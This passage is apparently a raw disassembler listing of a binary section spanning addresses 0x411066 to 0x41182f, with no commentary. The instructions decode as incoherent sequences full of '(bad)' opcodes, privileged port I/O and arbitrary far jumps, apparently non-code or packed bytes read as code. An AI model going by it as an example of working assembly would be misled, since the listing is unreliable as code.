  411066:	std    
  411067:	xor    ebp,DWORD PTR [ebx+0x2]
  41106a:	lods   eax,DWORD PTR ds:[esi]
  41106b:	push   0x4d
  41106d:	inc    edx
  41106e:	call   esi
  411070:	add    edi,DWORD PTR [edi]
  411072:	mov    ch,0x87
  411074:	mov    dh,0x21
  411076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411077:	call   0x9eb1e424
  41107c:	ins    DWORD PTR es:[edi],dx
  41107d:	inc    esi
  41107e:	data16 test BYTE PTR [esi],cl
  411081:	xor    dh,al
  411083:	xchg   ebx,eax
  411084:	and    BYTE PTR [edi],al
  411086:	retf   
  411087:	jo     0x41109f
  411089:	sub    BYTE PTR [eax+eax*4+0x2f],dh
  41108d:	cwde   
  41108e:	add    eax,0x7dc7984d
  411093:	push   eax
  411094:	(bad)  
  411095:	js     0x411060
  411097:	dec    ecx
  411098:	cmp    eax,0x4f306639
  41109d:	ret    
  41109e:	ror    DWORD PTR [ecx-0x4b],0x9d
  4110a2:	bnd jge 0x411124
  4110a5:	mov    esi,0x45ecc3e0
  4110aa:	xchg   BYTE PTR [edi-0x79632fc2],bh
  4110b0:	mov    ah,0xd0
  4110b2:	mov    al,ds:0x7e149ed2
  4110b7:	cwde   
  4110b8:	in     eax,dx
  4110b9:	push   0xeb892953
  4110be:	xlat   BYTE PTR ds:[ebx]
  4110bf:	sar    DWORD PTR [edx+0x51],cl
  4110c2:	inc    esi
  4110c3:	and    ebx,DWORD PTR ds:0xabc8a0f9
  4110c9:	jae    0x4110fd
  4110cb:	lahf   
  4110cc:	rcr    esp,0x48
  4110cf:	ins    BYTE PTR es:[edi],dx
  4110d0:	adc    ebp,DWORD PTR [ebp+eax*1+0x12e4a646]
  4110d7:	lods   eax,DWORD PTR ds:[esi]
  4110d8:	inc    ebp
  4110d9:	push   ss
  4110da:	loopne 0x41108f
  4110dc:	ret    0x8b7b
  4110df:	and    edx,DWORD PTR [ebp+edi*4-0x4ac3ced4]
  4110e6:	jp     0x41113e
  4110e8:	gs adc al,0xc8
  4110eb:	ja     0x4110cd
  4110ed:	aas    
  4110ee:	lahf   
  4110ef:	fild   DWORD PTR [edx+0x22e355b8]
  4110f5:	jl     0x41112c
  4110f7:	jg     0x4110d7
  4110f9:	ficom  WORD PTR [ecx]
  4110fb:	aas    
  4110fc:	lock sub al,0xf2
  4110ff:	or     edi,DWORD PTR [eax]
  411101:	int3   
  411102:	adc    al,al
  411104:	pop    edx
  411105:	jo     0x41110b
  411107:	lahf   
  411108:	das    
  411109:	mov    ds:0xbd966a3d,eax
  41110e:	retf   0x31a5
  411111:	js     0x4110b4
  411113:	pop    edx
  411114:	mov    esi,0x5266f06b
  411119:	adc    dl,BYTE PTR [edi+0x44f6bcf0]
  41111f:	fild   QWORD PTR [ebx+0x182e74fd]
  411125:	xchg   edx,eax
  411126:	or     esp,ebp
  411128:	pop    ebp
  411129:	mov    eax,0x9172379d
  41112e:	mov    bl,0x52
  411130:	inc    ebx
  411131:	and    esp,esp
  411133:	cld    
  411134:	stos   BYTE PTR es:[edi],al
  411135:	jb     0x4110e7
  411137:	or     cl,BYTE PTR gs:[edi-0x4d3fe198]
  41113e:	iret   
  41113f:	mov    edi,0xca8e1ccb
  411144:	dec    esi
  411145:	lods   al,BYTE PTR ds:[esi]
  411146:	aas    
  411147:	and    al,0x7e
  411149:	in     al,dx
  41114a:	push   0x55
  41114c:	gs inc esp
  41114e:	out    dx,eax
  41114f:	clc    
  411150:	loope  0x411181
  411152:	arpl   WORD PTR [ebx-0x530014f2],di
  411158:	ret    
  411159:	dec    esi
  41115a:	popf   
  41115b:	pop    edx
  41115c:	iret   
  41115d:	jg     0x4111c6
  41115f:	out    0xb6,eax
  411161:	inc    ebx
  411162:	neg    edi
  411164:	jl     0x411135
  411166:	sbb    al,0x62
  411168:	inc    ebx
  411169:	pushf  
  41116a:	lods   al,BYTE PTR ds:[esi]
  41116b:	mov    dh,0x18
  41116d:	jne    0x411180
  41116f:	rcr    DWORD PTR [ebx-0x576734d4],cl
  411175:	shl    DWORD PTR [ebp+0x47],0x92
  411179:	nop
  41117a:	sbb    dl,BYTE PTR [ebx]
  41117c:	jb     0x4111dc
  41117e:	stc    
  41117f:	ficomp WORD PTR [ebp+eax*1+0x6f13fcf0]
  411186:	sar    DWORD PTR [eax-0x1d3cc181],1
  41118c:	xor    al,0x38
  41118e:	add    ch,BYTE PTR [eax]
  411190:	sub    DWORD PTR [eax-0x2ef031e6],edx
  411196:	mov    ebx,0x64082fc5
  41119b:	or     dl,ah
  41119d:	fisttp QWORD PTR ds:0xd7804651
  4111a3:	sbb    DWORD PTR [ecx],esp
  4111a5:	adc    esp,DWORD PTR [edx+ebp*2+0x68e85c79]
  4111ac:	or     eax,0x7b18ea5a
  4111b1:	sub    cl,BYTE PTR [eax-0x13]
  4111b4:	cli    
  4111b5:	xchg   esp,eax
  4111b6:	adc    DWORD PTR [ebx-0x3a6f1f8f],ebp
  4111bc:	popf   
  4111bd:	rcr    bh,1
  4111bf:	pusha  
  4111c0:	stos   BYTE PTR es:[edi],al
  4111c1:	iret   
  4111c2:	fidivr DWORD PTR [edx+0x2844c551]
  4111c8:	retf   
  4111c9:	mov    eax,0x6e60b8b2
  4111ce:	pop    ebp
  4111cf:	inc    ebx
  4111d0:	xchg   esi,eax
  4111d1:	add    ecx,edx
  4111d3:	xchg   ebx,eax
  4111d4:	xchg   ebx,eax
  4111d5:	jmp    0x7f476bab
  4111da:	scas   al,BYTE PTR es:[edi]
  4111db:	xlat   BYTE PTR ds:[ebx]
  4111dc:	aas    
  4111dd:	sbb    DWORD PTR [ebp+0x51],edx
  4111e0:	test   al,0xaa
  4111e2:	shr    BYTE PTR ds:0x9ea4202d,cl
  4111e8:	push   ebx
  4111e9:	int    0x3c
  4111eb:	mov    DWORD PTR [edx+0x5],ebp
  4111ee:	leave  
  4111ef:	adc    DWORD PTR [edi],edx
  4111f1:	arpl   cx,bp
  4111f3:	div    DWORD PTR [esi+ebp*4-0x3636d4cf]
  4111fa:	sahf   
  4111fb:	sub    DWORD PTR [ecx],edi
  4111fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111fe:	mov    ecx,0xf0a46c26
  411203:	adc    al,0xfd
  411205:	jge    0x411282
  411207:	jle    0x4111af
  411209:	or     al,0xe2
  41120b:	cli    
  41120c:	ficom  WORD PTR [ebx-0x4fc0cbe9]
  411212:	xor    BYTE PTR [ebx*1-0x3ab47078],dh
  411219:	xor    DWORD PTR [esi+eiz*1-0x712be863],edi
  411220:	int3   
  411221:	and    ebx,eax
  411223:	jecxz  0x411200
  411225:	popa   
  411226:	test   eax,0x79a4f432
  41122b:	(bad)  
  41122c:	jmp    0x41121a
  41122e:	int    0xc6
  411230:	cwde   
  411231:	pop    ss
  411232:	in     al,0xfc
  411234:	push   0xffffff88
  411236:	nop
  411237:	iret   
  411238:	imul   ebx,DWORD PTR [edx],0xc4437a4d
  41123e:	dec    edx
  41123f:	dec    ebp
  411240:	xor    al,0x46
  411242:	jg     0x4111c8
  411244:	dec    ebp
  411245:	xor    al,0xba
  411247:	test   eax,0x3a116957
  41124c:	dec    ebp
  41124d:	jmp    0x411292
  41124f:	stc    
  411250:	cmc    
  411251:	inc    eax
  411252:	or     DWORD PTR [edx-0x46cb93f8],edi
  411258:	adc    eax,0xa2c1cf07
  41125d:	add    eax,DWORD PTR [ecx-0x6a3a6c08]
  411263:	loopne 0x4112bc
  411265:	xor    al,0x4e
  411267:	pop    ebp
  411268:	pop    ecx
  411269:	xchg   ebx,eax
  41126a:	sub    al,0x90
  41126c:	inc    esp
  41126d:	(bad)  
  41126f:	push   eax
  411270:	out    0xdb,al
  411272:	push   0x5d
  411274:	jne    0x411254
  411276:	retf   
  411277:	cmp    DWORD PTR [edx-0x1cd81836],esp
  41127d:	and    al,0x1e
  41127f:	mov    ebp,0x5d1e49d5
  411284:	outs   dx,BYTE PTR ds:[esi]
  411285:	jo     0x4112f4
  411287:	into   
  411288:	mov    eax,0xfab784c3
  41128d:	sub    eax,DWORD PTR [ecx-0x5d]
  411290:	push   ds
  411291:	jae    0x41122b
  411293:	xchg   ecx,eax
  411294:	add    BYTE PTR [esi+0x3c101819],bh
  41129a:	into   
  41129b:	push   0xf
  41129d:	xchg   ecx,eax
  41129e:	mov    ebp,DWORD PTR [ecx+0xa]
  4112a1:	xor    eax,0xc3495d6e
  4112a6:	jmp    0x1f86e45a
  4112ab:	xchg   ebp,eax
  4112ac:	xor    dh,ah
  4112ae:	stos   BYTE PTR es:[edi],al
  4112af:	lea    ebx,[esi+0x62]
  4112b2:	jp     0x4112d2
  4112b4:	imul   esp,DWORD PTR [edi+0xc789800],0x25819f9e
  4112be:	aaa    
  4112bf:	imul   esi,DWORD PTR [esi],0x11
  4112c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112c3:	sub    bh,cl
  4112c5:	xchg   ebx,eax
  4112c6:	lods   eax,DWORD PTR ds:[esi]
  4112c7:	aad    0x38
  4112c9:	mov    ecx,0x43c6bd79
  4112ce:	dec    esi
  4112cf:	adc    DWORD PTR [ebx+0x1eda9fe8],0x86bf690d
  4112d9:	push   ds
  4112da:	les    eax,FWORD PTR [edx-0x1d]
  4112dd:	push   ecx
  4112de:	adc    ebp,DWORD PTR [ebx+esi*2-0x2d]
  4112e2:	pop    ebp
  4112e3:	mov    ds:0x7e6e5ccb,eax
  4112e8:	out    0x83,eax
  4112ea:	jg     0x41133a
  4112ec:	inc    edi
  4112ed:	leave  
  4112ee:	retf   0x30d
  4112f1:	and    ch,BYTE PTR [edi-0x12fa8914]
  4112f7:	icebp  
  4112f8:	iret   
  4112f9:	test   DWORD PTR [ebp+0xc],edi
  4112fc:	ja     0x411355
  4112fe:	mov    al,0x87
  411300:	sbb    al,0xa0
  411302:	sub    al,0x3d
  411304:	fs scas al,BYTE PTR es:[edi]
  411306:	stos   BYTE PTR es:[edi],al
  411307:	outs   dx,DWORD PTR ds:[esi]
  411308:	pop    esi
  411309:	push   cs
  41130a:	mov    ch,0x48
  41130c:	xlat   BYTE PTR ds:[ebx]
  41130d:	jmp    0x1abf:0x8bd30fc9
  411314:	and    edi,DWORD PTR [edi-0xacc8f2d]
  41131a:	sub    eax,0xe39a3271
  41131f:	mov    dl,0x62
  411321:	push   esi
  411322:	sti    
  411323:	xchg   esi,eax
  411324:	sbb    bl,BYTE PTR [ecx+esi*2-0x2f1ba31d]
  41132b:	and    BYTE PTR [edi+0x103d95ca],ah
  411331:	in     al,dx
  411332:	xchg   ebp,eax
  411333:	pop    esp
  411334:	sub    al,0x4b
  411336:	pop    ebp
  411337:	das    
  411338:	sbb    DWORD PTR [ebx-0x33],edi
  41133b:	or     cl,BYTE PTR [esi]
  41133d:	push   ebp
  41133e:	xchg   ecx,eax
  41133f:	fs mov dh,0x92
  411342:	xchg   BYTE PTR [ecx-0x46],bh
  411345:	inc    ebx
  411346:	or     eax,0x44e43f7f
  41134b:	cmp    di,WORD PTR [edx+0x61fa3f64]
  411352:	sbb    ah,BYTE PTR [ebx]
  411354:	inc    esp
  411355:	and    ebx,ecx
  411357:	push   0x67
  411359:	mov    edx,0x1cfbfaa4
  41135e:	jne    0x4113b4
  411360:	adc    al,0x30
  411362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411363:	jge    0x41133d
  411365:	mov    edx,0x37841586
  41136a:	mov    ds:0xe91e34e6,eax
  41136f:	cmp    ch,BYTE PTR [edi-0x55e2625e]
  411375:	or     eax,0x97f69adb
  41137a:	adc    esi,DWORD PTR [ecx]
  41137c:	outs   dx,DWORD PTR ds:[esi]
  41137d:	rcl    DWORD PTR [ebp+0x73081157],1
  411383:	xchg   edx,eax
  411384:	push   ebx
  411385:	xchg   edx,eax
  411386:	outs   dx,BYTE PTR ds:[esi]
  411387:	add    bh,dl
  411389:	call   0xba71:0x71c97e9
  411390:	sub    eax,0xee0d918
  411395:	lods   eax,DWORD PTR ds:[esi]
  411396:	jmp    0xacef:0xaec30ad5
  41139d:	adc    ch,al
  41139f:	adc    eax,0x5f7caaf0
  4113a4:	ins    BYTE PTR es:[edi],dx
  4113a5:	mov    ch,BYTE PTR [eax-0x1a]
  4113a8:	pop    es
  4113a9:	adc    ebp,DWORD PTR [ecx]
  4113ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ac:	stos   BYTE PTR es:[edi],al
  4113ad:	ss pop ss
  4113af:	xor    DWORD PTR [edi],ebx
  4113b1:	lods   al,BYTE PTR ds:[si]
  4113b3:	add    BYTE PTR [ebx+ecx*8],0x74
  4113b7:	push   edi
  4113b8:	and    DWORD PTR [edi-0xe],esi
  4113bb:	mov    edi,esi
  4113bd:	arpl   WORD PTR [eax-0x50],cx
  4113c0:	popa   
  4113c1:	popf   
  4113c2:	and    BYTE PTR [eax-0x59],0x66
  4113c6:	mov    ss,WORD PTR [edx-0x4c]
  4113c9:	or     BYTE PTR [edx],dh
  4113cb:	pushf  
  4113cc:	pop    edx
  4113cd:	lea    esi,[ecx-0x18]
  4113d0:	mov    dl,0xa7
  4113d2:	pop    ecx
  4113d3:	stos   DWORD PTR es:[edi],eax
  4113d4:	jmp    0x47248d89
  4113d9:	jge    0x4113ba
  4113db:	mov    edi,esi
  4113dd:	xchg   edx,eax
  4113de:	mov    ah,0x72
  4113e0:	out    0x80,al
  4113e2:	and    dh,al
  4113e4:	adc    BYTE PTR [edx],bh
  4113e6:	add    al,BYTE PTR [esi]
  4113e8:	jg     0x41142a
  4113ea:	sar    DWORD PTR [ebx],0x59
  4113ed:	dec    esi
  4113ee:	ret    0xddec
  4113f1:	sar    BYTE PTR [ecx],0x97
  4113f4:	inc    esp
  4113f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113f6:	adc    DWORD PTR [esi-0x7d],ebp
  4113f9:	shl    DWORD PTR [edx+0x13],0x7b
  4113fd:	mov    gs,esp
  4113ff:	lods   al,BYTE PTR ds:[esi]
  411400:	mov    ebp,0x371bf053
  411405:	add    al,al
  411407:	cmp    edx,ebx
  411409:	cwde   
  41140a:	dec    ebp
  41140b:	add    ch,dh
  41140d:	bound  ebp,QWORD PTR [ebx-0x4177e9d7]
  411413:	xchg   ebp,eax
  411414:	jno    0x411401
  411416:	push   cs
  411417:	mov    eax,0x87415f90
  41141c:	(bad)  
  41141d:	xor    bl,BYTE PTR [ecx]
  41141f:	sub    ah,BYTE PTR [esi+0x4c]
  411422:	xchg   ebx,eax
  411423:	pop    edx
  411424:	sar    dh,cl
  411426:	int    0x21
  411428:	out    0x85,eax
  41142a:	jp     0x4113c0
  41142c:	daa    
  41142d:	test   ecx,esp
  41142f:	in     eax,0xa2
  411431:	xchg   ebp,eax
  411432:	xlat   BYTE PTR ds:[ebx]
  411433:	jo     0x411441
  411435:	mov    ah,0x86
  411437:	(bad)  
  411438:	adc    al,0x19
  41143a:	mov    ecx,0x6b82bcc9
  41143f:	sbb    al,al
  411441:	gs retf 
  411443:	icebp  
  411444:	shl    DWORD PTR cs:[edx+0x5f],0x47
  411449:	add    edi,DWORD PTR [eax]
  41144b:	dec    esp
  41144c:	push   edx
  41144d:	xor    eax,0x66eacee6
  411452:	std    
  411453:	cmp    al,0x8c
  411455:	pop    ss
  411456:	(bad)  
  411458:	pop    ds
  411459:	sbb    DWORD PTR [edx+0x51],ebx
  41145c:	or     DWORD PTR [ebx],ecx
  41145e:	pop    ecx
  41145f:	pop    eax
  411460:	jge    0x4113e3
  411462:	xor    eax,0x3fdaaeb5
  411467:	mov    ds:0x3d822171,al
  41146c:	adc    BYTE PTR [edx],ah
  41146e:	popa   
  41146f:	rol    BYTE PTR [edx],1
  411471:	push   0x52
  411473:	mov    BYTE PTR [esi-0x3c],bh
  411476:	lods   al,BYTE PTR ds:[esi]
  411477:	ret    0xaaac
  41147a:	fisub  WORD PTR fs:[edi+0x7]
  41147e:	mov    edi,0x62719808
  411483:	mov    ebx,0xf5925274
  411488:	mov    eax,ds:0x65cc7d7f
  41148d:	out    0x39,al
  41148f:	mov    ds:0x2c9e1c06,eax
  411494:	ffreep st(1)
  411496:	dec    esp
  411497:	in     eax,dx
  411498:	out    0x7b,eax
  41149a:	in     eax,0x2e
  41149c:	ror    DWORD PTR [ebx-0x66b55b4c],1
  4114a2:	aad    0xf0
  4114a4:	pop    ebp
  4114a5:	or     eax,0xda292397
  4114aa:	cli    
  4114ab:	dec    esp
  4114ac:	imul   DWORD PTR [edi+0x2cacdc1c]
  4114b2:	addr16 pop es
  4114b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114b5:	sbb    DWORD PTR [ebp-0x76],esi
  4114b8:	fidivr DWORD PTR [edi-0x19cb5e6b]
  4114be:	ss (bad) 
  4114c0:	repnz lods al,BYTE PTR ds:[esi]
  4114c2:	adc    DWORD PTR [edx],edi
  4114c4:	ins    BYTE PTR es:[edi],dx
  4114c5:	jp     0x411463
  4114c7:	push   cs
  4114c8:	jge    0x4114e7
  4114ca:	(bad)  
  4114cb:	push   es
  4114cc:	xchg   ch,dl
  4114ce:	test   ah,0x50
  4114d1:	sub    ecx,ebx
  4114d3:	adc    al,BYTE PTR [edi]
  4114d5:	stc    
  4114d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114d7:	popa   
  4114d8:	add    BYTE PTR [esi-0x70],0xc3
  4114dc:	dec    ecx
  4114dd:	push   ecx
  4114de:	enter  0x249b,0x2f
  4114e2:	xchg   edx,eax
  4114e3:	add    DWORD PTR [edi],eax
  4114e5:	nop
  4114e6:	push   ds
  4114e7:	pop    edi
  4114e8:	shl    DWORD PTR [eax+0x411e71be],0x10
  4114ef:	mov    ebp,0xa96c3ff4
  4114f4:	std    
  4114f5:	fld    QWORD PTR [ecx-0x25]
  4114f8:	ds jp  0x4114a1
  4114fb:	shl    BYTE PTR [eax+0x55],cl
  4114fe:	inc    esp
  4114ff:	(bad)  
  411500:	sub    al,BYTE PTR [edx+0x3f]
  411503:	jg     0x41156e
  411505:	jb     0x411581
  411507:	das    
  411508:	repnz bound esp,QWORD PTR [ecx+0x33081458]
  41150f:	rcr    BYTE PTR [edx+ecx*1+0x24],cl
  411513:	jmp    0xe0e7fe14
  411518:	add    BYTE PTR [ecx+ebx*1-0x2e],0x7d
  41151d:	loope  0x411521
  41151f:	xlat   BYTE PTR ds:[ebx]
  411520:	jb     0x41158e
  411522:	mov    ecx,0xa0531175
  411527:	cmp    esp,DWORD PTR [eax-0x7e]
  41152a:	(bad)  
  41152c:	add    ebx,DWORD PTR ds:0x7c2f85e9
  411532:	loopne 0x411559
  411534:	daa    
  411535:	loop   0x41154a
  411537:	in     al,dx
  411538:	sbb    edx,ecx
  41153a:	pop    ecx
  41153b:	mov    gs,WORD PTR [edi]
  41153d:	test   eax,0xa5672369
  411542:	jge    0x41154b
  411544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411545:	or     al,BYTE PTR [esi-0x2cac27f7]
  41154b:	push   ds
  41154c:	cmc    
  41154d:	mov    ecx,0xc5c92083
  411552:	add    esi,DWORD PTR [ebx+0x49]
  411555:	in     eax,0x51
  411557:	jnp    0x4115a3
  411559:	dec    ebx
  41155a:	mov    esi,edx
  41155c:	sahf   
  41155d:	(bad)  
  41155e:	loope  0x4114f3
  411560:	in     al,0xec
  411562:	icebp  
  411563:	imul   edx,DWORD PTR [edi+0x43],0xd568a6f1
  41156a:	test   al,dh
  41156c:	fstp   QWORD PTR [ebx]
  41156e:	xor    bl,BYTE PTR [ebx+0x7aebe8a]
  411574:	sbb    al,0x99
  411576:	xchg   ebp,eax
  411577:	xchg   edi,eax
  411578:	cmp    esp,DWORD PTR [edx+0x6e0463b8]
  41157e:	rcr    DWORD PTR [edx],cl
  411580:	push   cs
  411581:	cmp    BYTE PTR [edx],al
  411583:	mov    eax,ds:0x696e7b09
  411588:	ins    DWORD PTR es:[edi],dx
  411589:	dec    ebp
  41158a:	xor    ebp,esi
  41158c:	and    eax,0xf29fb990
  411591:	fwait
  411592:	jmp    0x4b1083a9
  411597:	popf   
  411598:	jmp    0xddb77126
  41159d:	jne    0x41155d
  41159f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115a0:	aas    
  4115a1:	outs   dx,DWORD PTR ds:[esi]
  4115a2:	outs   dx,BYTE PTR ds:[esi]
  4115a3:	xchg   BYTE PTR [ebx-0x1c],ah
  4115a6:	arpl   dx,di
  4115a8:	mov    ecx,0x1723fd1b
  4115ad:	fcom   DWORD PTR [ebx]
  4115af:	adc    edi,DWORD PTR [ebp+0x65]
  4115b2:	ins    BYTE PTR es:[edi],dx
  4115b3:	neg    DWORD PTR [ecx-0x28]
  4115b6:	xor    dl,BYTE PTR [esi+0x22d0cbb9]
  4115bc:	int    0xb4
  4115be:	adc    dl,ah
  4115c0:	aam    0x36
  4115c2:	inc    ecx
  4115c3:	pop    es
  4115c4:	ret    0x1698
  4115c7:	inc    eax
  4115c8:	pop    esi
  4115c9:	stc    
  4115ca:	enter  0x4cc7,0xe9
  4115ce:	inc    ecx
  4115cf:	popf   
  4115d0:	int3   
  4115d1:	scas   eax,DWORD PTR es:[edi]
  4115d2:	jmp    0xa4dc:0x7b21e619
  4115d9:	sbb    DWORD PTR [ebp+0x6bd4db9a],ebp
  4115df:	push   esp
  4115e0:	lea    esi,[esi+eax*8]
  4115e3:	sbb    DWORD PTR [esi-0x6f4d1807],ecx
  4115e9:	or     cl,BYTE PTR [esi]
  4115eb:	popf   
  4115ec:	sti    
  4115ed:	mov    esi,DWORD PTR [esi]
  4115ef:	mov    eax,0x2a6a07da
  4115f4:	neg    DWORD PTR [ecx+0x59244fd8]
  4115fa:	jmp    0xe021:0xf0cfef3f
  411601:	cdq    
  411602:	and    edx,DWORD PTR [edx]
  411604:	or     ah,BYTE PTR cs:[edi-0x60]
  411608:	cli    
  411609:	jno    0x41162a
  41160b:	inc    esp
  41160c:	ja     0x4115c2
  41160e:	jnp    0x411640
  411610:	or     DWORD PTR [ebx+0x45],edx
  411613:	jno    0x4115d7
  411615:	retf   
  411616:	or     esp,ebp
  411618:	jmp    0x41167f
  41161a:	jge    0x4115be
  41161c:	jp     0x411688
  41161e:	jbe    0x411635
  411620:	adc    eax,0x1d706d39
  411625:	mov    edi,0xc781d2c3
  41162a:	rcr    bh,1
  41162c:	(bad)  
  41162d:	inc    BYTE PTR [ebx+0x44]
  411630:	je     0x411684
  411632:	mov    ebp,0xe9472d86
  411637:	mov    bh,0xdc
  411639:	dec    ebx
  41163a:	arpl   WORD PTR [ecx-0x1e657fe8],bx
  411640:	xchg   edi,eax
  411641:	or     eax,0x23293a8f
  411646:	jg     0x411650
  411648:	cmp    eax,0x21f3a94f
  41164d:	jo     0x411622
  41164f:	jge    0x411655
  411651:	data16 cli 
  411653:	imul   esi,ecx,0xc146bb90
  411659:	xchg   ebp,eax
  41165a:	leave  
  41165b:	std    
  41165c:	sub    BYTE PTR [ebp+0x6bdbda1d],dl
  411662:	daa    
  411663:	fdivp  st(2),st
  411665:	adc    ah,BYTE PTR [edx+ebx*1-0x458f78f9]
  41166c:	mov    bl,0x13
  41166e:	rol    dl,1
  411670:	jbe    0x41167a
  411672:	add    eax,0x9bb84e15
  411677:	fistp  DWORD PTR [eax-0x23]
  41167a:	jae    0x4116e1
  41167c:	push   edi
  41167d:	cmp    BYTE PTR [eax-0x70c48478],dl
  411683:	ja     0x41168b
  411685:	mov    ah,0x66
  411687:	fsub   DWORD PTR [ecx+0x5a]
  41168a:	jecxz  0x411707
  41168c:	test   BYTE PTR [edi+0x27],dh
  41168f:	cmc    
  411690:	pusha  
  411691:	jo     0x411666
  411693:	mov    edx,0x664ac41a
  411698:	out    0x2d,eax
  41169a:	and    ch,BYTE PTR [esi]
  41169c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41169d:	xor    esi,esi
  41169f:	dec    eax
  4116a0:	mov    dh,0x49
  4116a2:	pop    ebp
  4116a3:	push   es
  4116a4:	into   
  4116a5:	mov    cl,0xe5
  4116a7:	je     0x4116eb
  4116a9:	xchg   ebp,eax
  4116aa:	adc    eax,DWORD PTR [edx+0x5b]
  4116ad:	in     eax,dx
  4116ae:	mov    eax,ds:0x8901db7e
  4116b3:	cmp    BYTE PTR [edx+0x5c],0x7f
  4116b7:	inc    ebx
  4116b8:	mov    cl,0x71
  4116ba:	sbb    edi,edx
  4116bc:	(bad)  
  4116be:	jge    0x41169a
  4116c0:	mov    ch,0xfb
  4116c2:	or     edx,DWORD PTR [edi-0x2d918379]
  4116c8:	mov    al,ds:0xee3c5f14
  4116cd:	jbe    0x411748
  4116cf:	test   BYTE PTR [ecx],bl
  4116d1:	xor    DWORD PTR [esi+0x203aad5a],eax
  4116d7:	loope  0x4116dc
  4116d9:	in     al,0x36
  4116db:	push   ecx
  4116dc:	jne    0x4116ce
  4116de:	ficom  WORD PTR [eax+0x72]
  4116e1:	ss in  eax,dx
  4116e3:	(bad)  
  4116e4:	mov    bh,0x99
  4116e6:	rol    BYTE PTR [eax-0x5f1a3de],1
  4116ec:	nop
  4116ed:	test   BYTE PTR [eax+esi*2],cl
  4116f0:	inc    eax
  4116f1:	mov    bl,0x44
  4116f3:	(bad)  
  4116f4:	and    DWORD PTR [esi+0x32],edx
  4116f7:	mov    ch,0xb2
  4116f9:	les    esp,FWORD PTR [eax+0x632cf221]
  4116ff:	xor    al,0x95
  411701:	jecxz  0x411776
  411703:	and    al,0xf0
  411705:	mov    esi,0xf23a7eb
  41170a:	(bad)  
  41170b:	not    BYTE PTR [ebp+0x25]
  41170e:	imul   edi,esi,0xffffffa3
  411711:	mov    edx,0x37eedec7
  411716:	inc    ecx
  411717:	cli    
  411718:	push   ds
  411719:	stos   DWORD PTR es:[edi],eax
  41171a:	inc    ebx
  41171b:	rol    BYTE PTR [edi-0xd9f1648],0x9e
  411722:	cli    
  411723:	ror    BYTE PTR [ebx],cl
  411725:	(bad)  
  411726:	addr16 push ds
  411728:	int3   
  411729:	mov    cl,dl
  41172b:	adc    al,0xc8
  41172d:	adc    edi,ecx
  41172f:	imul   ebp,DWORD PTR ds:0x5c10e5a5,0x48d89f2
  411739:	mov    ecx,0x12444cfd
  41173e:	imul   esi
  411740:	call   0x890:0x178dfce
  411747:	aam    0xb5
  411749:	repz xchg ebp,eax
  41174b:	test   DWORD PTR [edx-0x5fd17c43],ecx
  411751:	pop    ss
  411752:	repz sbb cl,BYTE PTR [esi+eiz*2+0x68]
  411757:	pusha  
  411758:	in     eax,0xa1
  41175a:	mov    ecx,0x27a2ae02
  41175f:	test   DWORD PTR [esp+edi*4+0x2],0x694bb0a7
  411767:	xchg   ebp,eax
  411768:	pop    edi
  411769:	clc    
  41176a:	mov    eax,ecx
  41176c:	mov    esp,0xfd670ef
  411771:	xchg   edx,eax
  411772:	sete   BYTE PTR [ebx]
  411775:	cmp    bl,BYTE PTR [ecx+eiz*4-0x1d]
  411779:	imul   ebp,DWORD PTR [eax+edi*2-0x74bf6a03],0xaedb5593
  411784:	outs   dx,BYTE PTR ds:[esi]
  411785:	loop   0x41174b
  411787:	out    dx,eax
  411788:	add    eax,0x7068fca9
  41178d:	mov    ah,0xef
  41178f:	xlat   BYTE PTR ds:[ebx]
  411790:	fs test eax,0xa5dfd2c2
  411796:	jo     0x411760
  411798:	scas   al,BYTE PTR es:[edi]
  411799:	mov    esp,0xe3140790
  41179e:	and    al,0xeb
  4117a0:	cld    
  4117a1:	dec    edi
  4117a2:	and    eax,0x71848c7
  4117a7:	mov    dh,0xb3
  4117a9:	stc    
  4117aa:	jmp    DWORD PTR [edi-0x28]
  4117ad:	out    0xe9,eax
  4117af:	inc    eax
  4117b0:	ins    BYTE PTR es:[edi],dx
  4117b1:	icebp  
  4117b2:	fisub  WORD PTR [ebx+0x222afda3]
  4117b8:	mov    ebp,0x790a725a
  4117bd:	popf   
  4117be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117bf:	mov    ds:0x1af0ee0c,al
  4117c4:	sub    al,0xae
  4117c6:	jge    0x411843
  4117c8:	mov    BYTE PTR [ebp+0x241f430b],0xdb
  4117cf:	inc    ecx
  4117d0:	sahf   
  4117d1:	popf   
  4117d2:	sub    BYTE PTR [edi+esi*2+0x185e1c2b],dh
  4117d9:	xor    DWORD PTR [edi-0x25],ebp
  4117dc:	aam    0x5c
  4117de:	ins    BYTE PTR es:[edi],dx
  4117df:	icebp  
  4117e0:	fisttp QWORD PTR [edi+ebp*4+0x5a3de471]
  4117e7:	sahf   
  4117e8:	xchg   edi,eax
  4117e9:	xchg   BYTE PTR ds:0xc1a08582,ah
  4117ef:	test   eax,0xeb85859d
  4117f4:	cli    
  4117f5:	xchg   edi,eax
  4117f6:	mov    ecx,0x4bf12914
  4117fb:	ins    BYTE PTR es:[edi],dx
  4117fc:	or     eax,0x56901103
  411801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411802:	mov    ?,WORD PTR [ecx+0x3209334a]
  411808:	gs pop ss
  41180a:	or     eax,0x43f23a0b
  41180f:	popa   
  411810:	and    eax,DWORD PTR [eax-0x7d478c8b]
  411816:	xor    eax,0x94fd6c3
  41181b:	mov    dl,0x35
  41181d:	leave  
  41181e:	loopne 0x4117ee
  411820:	in     al,0x1b
  411822:	inc    esp
  411823:	outs   dx,DWORD PTR ds:[esi]
  411824:	retf   
  411825:	mov    ah,0xeb
  411827:	pop    ecx
  411828:	xchg   edx,eax
  411829:	push   cs
  41182a:	scas   eax,DWORD PTR es:[edi]
  41182b:	iret   
  41182c:	xchg   edi,eax
  41182d:	js     0x411829
  41182f:	leave  
